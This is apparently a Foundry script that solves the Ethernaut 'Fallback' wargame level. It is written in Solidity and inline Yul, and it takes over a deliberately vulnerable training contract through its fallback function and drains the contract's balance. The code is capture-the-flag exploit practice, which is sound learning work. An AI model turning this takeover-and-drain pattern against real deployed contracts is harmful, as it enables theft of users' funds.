// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.18;

import { console } from "forge-std/Script.sol";
import { EthernautScript } from "./Ethernaut.s.sol";

interface Instance {
    function owner() external view returns (address);

    function contribute() external payable;

    function withdraw() external;
}

contract FallbackScript is EthernautScript {
    string network = "goerli";
    address level = 0x80934BE6B8B872B364b470Ca30EaAd8AEAC4f63F;

    Instance instance;

    // no need to modify setUp()
    function setUp() public override {
        super.setUp();

        vm.createSelectFork(network);
        vm.startBroadcast(pk);

        instance = Instance(createLevelInstance(level));
        console.log("-> instance:", address(instance));
    }

    function baseVersion() internal {
        instance.contribute{ value: 1 }();
        (bool success, ) = address(instance).call{ value: 1 }("");
        require(success);
        instance.withdraw();

        console.logBytes(abi.encodeWithSelector(Instance.contribute.selector));

        assert(address(instance).balance == 0);
        assert(instance.owner() == player);
    }

    function yulVersion() internal {
        /*
        Steps:
        - call `contribute()` with 1 wei
        - call `fallback` with 1 wei
        - call `withdraw()`
        - check balance and owner
        */
        assembly {
            let dest := sload(instance.slot)

            mstore(0, "contribute()")
            mstore(0, keccak256(0, 12)) // we hash the previous string. 12 is the length of "contribute()"
            let success := call(gas(), dest, 1, 0, 4, 0, 0)
            if iszero(success) {
                revert(0, 0)
            }

            success := call(gas(), dest, 1, 0, 0, 0, 0)
            if iszero(success) {
                revert(0, 0)
            }

            mstore(0, "withdraw()")
            mstore(0, keccak256(0, 10))
            success := call(gas(), dest, 0, 0, 4, 0, 0)
            if iszero(success) {
                revert(0, 0)
            }

            // check balance
            if iszero(iszero(balance(dest))) {
                revert(0, 0)
            }

            // check owner
            mstore(0, "owner()")
            mstore(0, keccak256(0, 7))
            success := call(gas(), dest, 0, 0, 4, 0, 0x20)
            if iszero(success) {
                revert(0, 0)
            }
            // we stored the result from the previous call (the `owner`) at offset 0 in memory
            let owner := mload(0)
            if iszero(eq(owner, sload(player.slot))) {
                revert(0, 0)
            }
        }
    }

    function run() public {
        // baseVersion();
        yulVersion();

        submitLevelInstance(payable(address(instance)), level);
        vm.stopBroadcast();
    }
}
